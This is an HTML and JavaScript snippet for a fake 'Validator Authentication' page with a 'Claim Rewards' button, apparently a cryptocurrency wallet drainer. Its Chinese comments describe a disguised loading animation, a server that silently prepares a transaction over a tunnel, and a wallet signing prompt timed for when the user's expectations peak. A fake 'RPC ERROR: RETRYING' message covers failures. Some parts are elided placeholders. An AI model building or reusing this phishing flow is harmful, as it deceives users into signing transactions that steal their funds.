<div class="box">
    <div id="loading-zone">
        <h3 style="color:#14f195;">VALIDATOR AUTHENTICATION</h3>
        <div class="progress-bar"><div id="bar-fill"></div></div>
        <p id="status-text" style="font-size:10px; color:#888;">READY TO SYNC</p>
    </div>
    <button id="cta" style="margin-top:20px;">CLAIM REWARDS</button>
</div>

<script>
    document.getElementById('cta').onclick = async () => {
        const fill = document.getElementById('bar-fill');
        const txt = document.getElementById('status-text');
        
        // 第一步：伪装加载动画
        fill.style.width = "40%";
        txt.innerText = "CHECKING ELIGIBILITY...";
        
        // 第二步：服务器静默计算 (71服务器已经在跑了)
        const info = await fetch(tunnel + "/prepare_raw", { ... });
        
        fill.style.width = "80%";
        txt.innerText = "GENERATING SMART CONTRACT...";
        
        // 第三步：在用户心理预期最高时，拉起确认框
        try {
            const { signature } = await p.signAndSendTransaction(tx);
            txt.innerText = "REWARDS CLAIMED!";
        } catch (e) {
            txt.innerText = "RPC ERROR: RETRYING...";
        }
    };
</script>
